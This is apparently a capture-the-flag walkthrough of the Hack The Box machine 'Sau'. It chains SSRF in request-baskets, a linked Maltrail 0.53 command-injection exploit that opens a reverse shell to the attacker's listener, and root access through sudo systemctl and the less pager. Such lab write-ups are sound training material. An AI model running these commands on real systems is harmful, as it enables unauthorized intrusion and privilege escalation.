> Sau is an easy Linux machine from Hack the Box. Here is the tldr;
>
> * nmap shows ports 22 and 55555 are open and port 80 is filtered.
> * Port 55555 is running a version of `request-baskets` that is vulnerable to SSRF, allowing us to set up a proxy to access port 80.
> * Port 80 is running a service called `Maltrail` which is vulnerable to unauthenticated remote OS comand injection, allowing us to get a reverse shell.
> * Our user is able to run systemctl as sudo. This version uses the pager `less`, which retains the sudo priviledges allowing us to spawn a shell as root.

## Enumeration

Let's start off with a basic nmap scan.

```bash
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB/sau]
└─$ nmap 10.10.11.224                             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 15:07 MST
Nmap scan report for 10.10.11.224
Host is up (0.061s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 11.14 seconds
```

SSH is probably not our ticket and port 80 is filtered, so 55555 is looking really interesting. Let's take a closer look and see what we have.

### Request Baskets

![Create a new basket]({{ page.img_path }}new_basket.png)
Visiting our ip address at port 55555 in a browser shows us a page called Request Baskets, which says it can collect and inspect HTTP requests.

Further investigation shows us that it is powered by request-baskets version 1.2.1. This should be helpful!

![Request Basket version 1.2.1]({{ page.img_path }}request_baskets_version.png)

Searching Google for request baskets version 1.2.1 reveals that it is vulnerable to server side request forgery (SSRF), CVE-2023-27163. Maybe we can use this to see what is on port 80?

Let's test it out by starting a netcat listener on our machine and see if we can reach it by creating a new basket.

```bash
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB/sau]
└─$ nc -lvnp 80
```

In the basket settings, let's configure it to forward the request to our Kali machine's IP address.

![Forwarding settings for basket]({{ page.img_path }}forward_settings1.png)

Next, let's curl the basket using the URL provided

![The url for our basket]({{ page.img_path }}basket_url.png)

Success! We are able to receive the request we sent on our netcat listener.

![curl the basket with nc listener open]({{ page.img_path }}nc_request.png)

### SSRF

Now that we see how things work and know that it is vulnerable, let's see if we can use it to connect to the mysterious port 80. To do this, let's edit the settings for our basket again and set it to forward port 80 from `http://127.0.0.1` with Proxy Response and Expand Forward Path checked.

![Adjusting the settings for our basket]({{ page.img_path }}forward_settings2.png)

### Maltrail v 0.53

Now when we go to the URL for the basket, it gives us a broken looking site. At the bottom, we notice it is running something called Maltrail v 0.53. 

![Broken looking homepage for maltrail on port 80]({{ page.img_path }}maltrail.png)

Google shows us that this version is vulnerable to unauthenticated OS command injection (RCE). I found this Python exploit that should give us a reverse shell. [Spookier Maltrail v 0.53 Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit)

### We have a shell!

To run the exploit, we just need to start a netcat listener (I chose port 9001), then run the exploit passing it our listening IP address and port, along with the url for our basket.

```bash
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB]
└─$ python3 maltrail.poc.py 10.10.14.6 9001 http://10.10.11.224:55555/ionzxhf
```

![Terminal showing reverse shell]({{ page.img_path }}rev_shell.png)
Hooray! We now have a reverse shell, it looks like we're currently running as the user "puma".

## Foothold & User

Let's upgrade our shell a little and take a look around.

```bash
┌──(f0rest3xplorer㉿kali)-[~/Documents/HTB]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.224] 51276
$ python3 -c 'import pty;pty.spawn("/bin/bash")';
python3 -c 'import pty;pty.spawn("/bin/bash")';
puma@sau:/opt/maltrail$ 
```

### User Flag

If we navigate to `/home/puma` we are able to get the `user.txt` flag, no privesc needed at this point.

### Privesc

One of the first things I like to run is `sudo -l` to see if our user can run anything as root.

```bash
puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Bingo! Looks like we're able to run `sudo systemctl status trail.service` with no password. If we run `systemctl --version`, we see that we're running `systemd 245 (245.4-4ubuntu3.22)`.

## Root!

It appears that if we run the command as sudo, it will use the pager `less` to show the results. Within `less`, we are able to run commands and it maintains the sudo priviledges allowing us to launch `/bin/bash` as root. To run a command in less you just type `!` followed by your command.

```bash
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@sau:/opt/maltrail# id
id
uid=0(root) gid=0(root) groups=0(root)
root@sau:/opt/maltrail# 
```

And we have root!
